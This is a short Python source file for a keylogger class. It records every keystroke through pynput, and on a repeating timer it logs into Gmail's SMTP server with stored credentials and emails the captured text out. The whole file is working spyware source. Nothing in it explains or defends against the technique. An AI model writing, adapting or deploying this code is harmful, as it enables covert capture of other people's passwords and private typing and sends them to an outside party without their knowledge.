#!/user/bin/env python
import pynput.keyboard, smtplib
import threading

class Keylogger:
	def __init__(self, email, password, time):
		self.email = email
		self.password = password
		self.time = time
		self.log="started"	
	def send_mail(self, email, password, message):
		server= smtplib.SMTP("smtp.gmail.com", 587)
		server.starttls()
		server.login(email,password)
		print("login successfull")
		server.sendmail(email, email, message)
		server.quit()

	def record_strikes(self, key):
		
		
		try:
			self.log += str(key.char)
		except AttributeError:
			if key == key.space:
				self.log += " "
			else:
				self.log += " "+str(key)+" "
		print (self.log)
		
	def time_stamp(self):
		
		self.send_mail(self.email, self.password, self.log)
		self.log=""
		tiktok= threading.Timer(self.time , self.time_stamp)
		tiktok.start()

	def start(self):
		keyboard_listener = pynput.keyboard.Listener(on_press = self.record_strikes)
		with keyboard_listener:
			self.time_stamp()
			keyboard_listener.join()
